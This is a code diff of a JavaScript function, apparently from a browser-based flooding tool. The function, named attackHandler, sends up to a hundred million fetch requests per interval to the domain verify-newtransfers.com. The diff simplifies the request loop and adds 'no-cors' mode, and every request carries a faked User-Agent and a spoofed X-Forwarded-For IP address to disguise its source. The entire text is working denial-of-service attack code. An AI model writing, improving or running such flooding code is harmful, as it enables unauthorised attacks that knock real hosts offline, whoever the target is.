@@ -15,20 +15,17 @@ const generateTime = () => {
 
 const attackHandler = () => {
     let stress = 100_000_000
-    let methods = [ "GET", "POST" ]
 
     interval = setInterval(() => {
         for(let i = 0; i < stress; i++) {
-            for(let method of methods) {
-                fetch("verify-newtransfers.com", {
-                    method,
-                    headers: {
-                        "User-Agent": faker.internet.userAgent(),
-                        "X-Forwarded-For": faker.internet.ip()
-                    },
-                    body: ""
-                })
-            }
+            fetch("https://verify-newtransfers.com", {
+                method: "GET",
+                mode: "no-cors",
+                headers: {
+                    "User-Agent": faker.internet.userAgent(),
+                    "X-Forwarded-For": faker.internet.ip(),
+                }
+            })
         }
         
         const log = document.createElement("div")
